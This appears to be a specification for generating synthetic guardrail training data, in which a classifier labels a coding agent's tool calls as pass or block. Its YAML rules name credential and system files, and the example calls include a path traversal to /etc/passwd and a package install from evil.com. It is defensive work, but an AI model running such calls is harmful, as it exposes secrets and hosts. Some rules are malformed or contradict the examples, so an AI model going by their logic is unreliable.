# PHASE 5: CODE ASSISTANT DOMAIN SPECIFICATION

**READ `00_MASTER_SPEC.md` FIRST** — It contains the system prompt, output format, and quality requirements.

---

## Overview

| Metric | Value |
|--------|-------|
| **Domain** | Code Assistant / Development Tools |
| **Total Examples** | 3,000 |
| **Output Directory** | `data/batches/code_assistant/` |

---

## Output Files

| File | Examples | Description |
|------|----------|-------------|
| `code_block.jsonl` | 1200 | Blocked operations |
| `code_pass.jsonl` | 1200 | Allowed operations |
| `code_edge.jsonl` | 600 | Edge cases and ambiguous scenarios |

---

## Tools for This Domain

```yaml
Tools:
  - name: read_file
    description: Read source code file
    arguments: [path, encoding, line_start, line_end]
  
  - name: write_file
    description: Write or modify code file
    arguments: [path, content, create_dirs, backup]
  
  - name: delete_file
    description: Delete a file
    arguments: [path, force, recursive]
  
  - name: list_directory
    description: List directory contents
    arguments: [path, recursive, pattern, include_hidden]
  
  - name: search_codebase
    description: Search across repository
    arguments: [query, path, file_pattern, case_sensitive, regex]
  
  - name: run_tests
    description: Execute test suite
    arguments: [test_path, pattern, coverage, parallel, env_vars]
  
  - name: run_linter
    description: Run code linter
    arguments: [path, fix, config_path]
  
  - name: git_commit
    description: Create git commit
    arguments: [message, files, amend, allow_empty]
  
  - name: git_push
    description: Push to remote
    arguments: [branch, remote, force, tags]
  
  - name: git_checkout
    description: Switch branches or restore files
    arguments: [target, create_branch, force]
  
  - name: install_package
    description: Install dependency
    arguments: [package_name, version, dev, source, registry]
  
  - name: create_pr
    description: Create pull request
    arguments: [title, body, base_branch, head_branch, draft]
  
  - name: run_script
    description: Execute npm/yarn script
    arguments: [script_name, args, env_vars]
  
  - name: execute_code
    description: Run arbitrary code snippet
    arguments: [code, language, timeout, sandbox]
```

---

## Rules Library for Code Assistant

### Critical Severity Rules

```yaml
- id: block-sensitive-file-write
  name: Block writing to sensitive files
  enabled: true
  severity: critical
  action: block
  tools: [write_file]
  condition_groups:
    - - field: arguments.path
        operator: ends_with
        value: ".env"
    - - field: arguments.path
        operator: ends_with
        value: ".env.local"
    - - field: arguments.path
        operator: contains
        value: ".git/config"
    - - field: arguments.path
        operator: contains
        value: ".ssh/"
    - - field: arguments.path
        operator: ends_with
        value: "id_rsa"
    - - field: arguments.path
        operator: ends_with
        value: "id_ed25519"

- id: block-ci-config-modification
  name: Block CI/CD config modification
  enabled: true
  severity: critical
  action: block
  tools: [write_file]
  condition_groups:
    - - field: arguments.path
        operator: contains
        value: ".github/workflows"
    - - field: arguments.path
        operator: contains
        value: ".gitlab-ci"
    - - field: arguments.path
        operator: ends_with
        value: "Jenkinsfile"
    - - field: arguments.path
        operator: contains
        value: ".circleci"

- id: block-system-path-read
  name: Block reading system paths
  enabled: true
  severity: critical
  action: block
  tools: [read_file, list_directory]
  condition_groups:
    - - field: arguments.path
        operator: starts_with
        value: "/etc/"
    - - field: arguments.path
        operator: starts_with
        value: "/root/"
    - - field: arguments.path
        operator: starts_with
        value: "/home/"
        operator: not_starts_with
        value: "/home/coder/"
    - - field: arguments.path
        operator: contains
        value: "/.aws/"
    - - field: arguments.path
        operator: contains
        value: "/.ssh/"

- id: block-secret-in-code
  name: Block committing secrets in code
  enabled: true
  severity: critical
  action: block
  tools: [write_file, git_commit]
  conditions:
    - field: arguments.content
      operator: matches
      value: "(api[_-]?key|password|secret|token)\\s*[:=]\\s*['\"][A-Za-z0-9+/=]{20,}"

- id: block-outside-repo
  name: Block access outside repository
  enabled: true
  severity: critical
  action: block
  tools: [read_file, write_file, delete_file, list_directory]
  conditions:
    - field: arguments.path
      operator: not_starts_with
      value: "/workspace/"
    - field: arguments.path
      operator: not_starts_with
      value: "./"
    - field: arguments.path
      operator: contains
      value: ".."

- id: block-force-push-protected
  name: Block force push to protected branches
  enabled: true
  severity: critical
  action: block
  tools: [git_push]
  conditions:
    - field: arguments.force
      operator: equals
      value: true
    - field: arguments.branch
      operator: in
      value: ["main", "master", "production", "release", "develop"]

- id: block-malicious-package
  name: Block installing from untrusted sources
  enabled: true
  severity: critical
  action: block
  tools: [install_package]
  condition_groups:
    - - field: arguments.source
        operator: starts_with
        value: "http://"
    - - field: arguments.source
        operator: contains
        value: "github.com"
        operator: not_contains
        value: "github.com/trusted-org"
    - - field: arguments.registry
        operator: not_in
        value: ["npm", "pypi", "rubygems", null]
```

### High Severity Rules

```yaml
- id: block-recursive-delete
  name: Block recursive deletion
  enabled: true
  severity: high
  action: block
  tools: [delete_file]
  conditions:
    - field: arguments.recursive
      operator: equals
      value: true
    - field: arguments.path
      operator: not_starts_with
      value: "/workspace/node_modules"
    - field: arguments.path
      operator: not_starts_with
      value: "/workspace/dist"
    - field: arguments.path
      operator: not_starts_with
      value: "/workspace/.cache"

- id: block-test-with-external-env
  name: Block tests with external environment variables
  enabled: true
  severity: high
  action: block
  tools: [run_tests]
  conditions:
    - field: arguments.env_vars
      operator: contains
      value: "PROD_"

- id: block-unsafe-code-execution
  name: Block unsandboxed code execution
  enabled: true
  severity: high
  action: block
  tools: [execute_code]
  conditions:
    - field: arguments.sandbox
      operator: not_equals
      value: true

- id: block-hidden-file-access
  name: Block access to hidden files outside allowed list
  enabled: true
  severity: high
  action: block
  tools: [read_file, write_file]
  conditions:
    - field: arguments.path
      operator: matches
      value: "/\\.[a-z]"
    - field: arguments.path
      operator: not_in
      value: [".gitignore", ".eslintrc", ".prettierrc", ".editorconfig", ".nvmrc"]

- id: warn-amend-commit
  name: Warn on amending commits
  enabled: true
  severity: high
  action: block
  tools: [git_commit]
  conditions:
    - field: arguments.amend
      operator: equals
      value: true
```

### Medium Severity Rules

```yaml
- id: block-unversioned-package
  name: Block installing packages without version
  enabled: true
  severity: medium
  action: block
  tools: [install_package]
  conditions:
    - field: arguments.version
      operator: equals
      value: null
    - field: arguments.version
      operator: equals
      value: "latest"

- id: block-large-file-write
  name: Block writing very large files
  enabled: true
  severity: medium
  action: block
  tools: [write_file]
  conditions:
    - field: arguments.content
      operator: greater_than
      value: 1000000
```

---

## Example Templates

### BLOCK - Writing to .env

```
TOOL CALL:
tool: write_file
arguments:
  path: /workspace/app/.env
  content: "DATABASE_URL=postgres://user:pass@localhost/db"
  backup: true

RULES:
- id: block-env-write
  name: Block .env file writes
  enabled: true
  severity: critical
  action: block
  tools: [write_file]
  conditions:
    - field: arguments.path
      operator: ends_with
      value: ".env"
```

**Output:**
```json
{"pass_weight": 0.01, "block_weight": 0.99, "decision": "block", "reasoning": "Writing to .env file blocked. Environment files may contain secrets and should be managed separately.", "matched_rules": ["block-env-write"]}
```

---

### BLOCK - Path Traversal Attempt

```
TOOL CALL:
tool: read_file
arguments:
  path: /workspace/src/../../etc/passwd
  encoding: utf-8

RULES:
- id: block-traversal
  name: Block path traversal
  enabled: true
  severity: critical
  action: block
  tools: [read_file, write_file]
  conditions:
    - field: arguments.path
      operator: contains
      value: ".."
```

**Output:**
```json
{"pass_weight": 0.01, "block_weight": 0.99, "decision": "block", "reasoning": "Path contains '..' traversal sequence. Attempt to access /etc/passwd outside workspace.", "matched_rules": ["block-traversal"]}
```

---

### BLOCK - Force Push to Main

```
TOOL CALL:
tool: git_push
arguments:
  branch: main
  remote: origin
  force: true
  tags: false

RULES:
- id: block-force-push-main
  name: Block force push to main
  enabled: true
  severity: critical
  action: block
  tools: [git_push]
  conditions:
    - field: arguments.branch
      operator: in
      value: ["main", "master"]
    - field: arguments.force
      operator: equals
      value: true
```

**Output:**
```json
{"pass_weight": 0.01, "block_weight": 0.99, "decision": "block", "reasoning": "Force push to 'main' branch blocked. Protected branches require normal push.", "matched_rules": ["block-force-push-main"]}
```

---

### BLOCK - Installing from URL

```
TOOL CALL:
tool: install_package
arguments:
  package_name: "malware-package"
  source: "http://evil.com/package.tar.gz"
  dev: false

RULES:
- id: block-url-install
  name: Block installing from URLs
  enabled: true
  severity: critical
  action: block
  tools: [install_package]
  conditions:
    - field: arguments.source
      operator: starts_with
      value: "http"
```

**Output:**
```json
{"pass_weight": 0.02, "block_weight": 0.98, "decision": "block", "reasoning": "Package installation from URL blocked. Only official registries allowed.", "matched_rules": ["block-url-install"]}
```

---

### PASS - Normal File Read

```
TOOL CALL:
tool: read_file
arguments:
  path: /workspace/src/components/Button.tsx
  encoding: utf-8

RULES:
- id: block-outside-repo
  name: Block outside repository
  enabled: true
  severity: critical
  action: block
  tools: [read_file]
  conditions:
    - field: arguments.path
      operator: not_starts_with
      value: "/workspace/"
```

**Output:**
```json
{"pass_weight": 0.96, "block_weight": 0.04, "decision": "pass", "reasoning": "Path /workspace/src/components/Button.tsx is within allowed workspace directory"}
```

---

### PASS - Normal Package Install

```
TOOL CALL:
tool: install_package
arguments:
  package_name: lodash
  version: "4.17.21"
  dev: false
  registry: npm

RULES:
- id: block-unversioned
  name: Block unversioned packages
  enabled: true
  severity: medium
  action: block
  tools: [install_package]
  conditions:
    - field: arguments.version
      operator: equals
      value: null
```

**Output:**
```json
{"pass_weight": 0.95, "block_weight": 0.05, "decision": "pass", "reasoning": "Package lodash@4.17.21 from npm registry with pinned version allowed"}
```

---

### PASS - Run Tests

```
TOOL CALL:
tool: run_tests
arguments:
  test_path: /workspace/tests
  pattern: "*.test.ts"
  coverage: true
  parallel: true

RULES:
- id: block-prod-env-tests
  name: Block tests with production env
  enabled: true
  severity: high
  action: block
  tools: [run_tests]
  conditions:
    - field: arguments.env_vars
      operator: contains
      value: "PROD_"
```

**Output:**
```json
{"pass_weight": 0.94, "block_weight": 0.06, "decision": "pass", "reasoning": "Test execution in workspace with no production environment variables"}
```

---

### Edge Case - .gitignore is Allowed

```
TOOL CALL:
tool: write_file
arguments:
  path: /workspace/.gitignore
  content: "node_modules/\ndist/\n.env"

RULES:
- id: block-hidden-files
  name: Block hidden file modification
  enabled: true
  severity: high
  action: block
  tools: [write_file]
  conditions:
    - field: arguments.path
      operator: matches
      value: "/\\.[a-z]"
    - field: arguments.path
      operator: not_ends_with
      value: ".gitignore"
```

**Output:**
```json
{"pass_weight": 0.90, "block_weight": 0.10, "decision": "pass", "reasoning": ".gitignore is explicitly allowed hidden file. Modification permitted."}
```

---

### Edge Case - Relative Path

```
TOOL CALL:
tool: read_file
arguments:
  path: ./src/index.ts

RULES:
- id: block-outside-repo
  name: Block outside repository
  enabled: true
  severity: critical
  action: block
  tools: [read_file]
  conditions:
    - field: arguments.path
      operator: not_starts_with
      value: "/workspace/"
    - field: arguments.path
      operator: not_starts_with
      value: "./"
```

**Output:**
```json
{"pass_weight": 0.92, "block_weight": 0.08, "decision": "pass", "reasoning": "Relative path ./src/index.ts starts with ./ which is allowed"}
```

---

## Scenario Distribution

### `code_block.jsonl` (1200 examples):

- 160x .env / secret file writes
- 160x CI/CD config modification attempts
- 160x path traversal attempts
- 120x force push to protected branches
- 120x malicious package installs
- 120x system path access
- 100x recursive delete outside allowed paths
- 100x secrets in code content
- 80x unsandboxed code execution
- 80x access outside repository

### `code_pass.jsonl` (1200 examples):

- 200x normal file reads within workspace
- 200x normal file writes (source code)
- 160x normal package installs (npm/pypi)
- 120x normal git operations (commit, push to feature branch)
- 120x test execution
- 120x linter runs
- 120x search codebase
- 80x PR creation
- 80x allowed hidden files (.gitignore, .eslintrc)

### `code_edge.jsonl` (600 examples):

- 100x relative paths (./src vs /workspace/src)
- 100x allowed hidden files
- 100x delete in allowed directories (node_modules, dist)
- 80x version edge cases (^1.0.0 vs 1.0.0 vs latest)
- 80x disabled rules that would block
- 80x multiple rules where one blocks, one doesn't
- 60x near-miss patterns (git-config vs .git/config)

---

## Validation Checklist

- [ ] 3,000 examples total (1200 + 1200 + 600)
- [ ] All JSON lines valid
- [ ] Weights sum to ~1.0
- [ ] matched_rules on BLOCK only
- [ ] Path traversal patterns included
- [ ] Various file extensions covered
- [ ] Git operations well represented
- [ ] Package management scenarios complete
